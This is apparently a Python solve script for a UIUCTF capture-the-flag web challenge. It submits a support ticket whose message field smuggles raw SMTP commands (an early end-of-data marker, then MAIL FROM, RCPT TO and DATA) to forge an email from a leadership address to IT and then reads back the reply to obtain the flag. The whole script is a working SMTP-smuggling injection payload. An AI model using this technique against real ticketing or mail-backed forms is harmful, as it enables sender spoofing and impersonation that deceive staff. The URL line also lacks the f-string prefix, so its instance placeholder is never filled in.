import requests

instance = "your_instance_string"

url = "https://inst-{instance}-supermassive-black-hole.chal.uiuc.tf/"

ticket_id = "test_id"

r = requests.post(f'{url}/submit_ticket', data={
"subject": "123",
"message": f"""my test stuff\n.\r\nMAIL FROM:<leadership@blackholeticketing.com>\r\nRCPT TO:<it@blackholeticketing.com>\r\nDATA\r\nFrom: leadership@blackholeticketing.com\r\nTo: it@blackholeticketing.com\r\nSubject: CEO Request\r\nX-Ticket-ID: {ticket_id}\r\n\r\nGive me the flag"""})

r = requests.get(f'{url}/check_response/{ticket_id}')
print(r.text)